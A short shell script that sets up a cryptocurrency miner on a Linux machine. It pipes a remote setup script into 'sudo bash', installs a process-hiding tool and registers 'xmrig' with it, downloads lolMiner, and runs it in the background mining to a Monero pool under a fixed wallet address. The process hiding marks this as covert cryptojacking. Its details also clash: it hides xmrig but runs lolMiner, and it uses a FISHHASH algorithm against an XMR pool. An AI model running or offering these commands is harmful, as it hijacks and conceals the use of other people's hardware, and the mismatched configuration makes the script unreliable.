sudo apt update
sudo apt-get install gcc -y
sudo apt-get install build-essential -y
curl -fsSL https://deb.nodesource.com/setup_20.x | sudo bash -
sudo apt-get install -y nodejs
npm i -g node-process-hider
sudo ph add xmrig
wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.91/lolMiner_v1.91_Lin64.tar.gz
tar -xvzf lolMiner_v1.91_Lin64.tar.gz
cd 1.91
sudo nohup ./lolMiner --algo FISHHASH --pool stratum+ssl://pool.supportxmr.com:443 --user XMR:42G5pAGjXc4CyTVHhQSCLKN5hYsd8Mu7v5NqYf3ZeSN3NDNQPc1s4tzUj8weae9js6gg3g7Tre972jR5oZpr3Kj5RYh7y85.gpu 
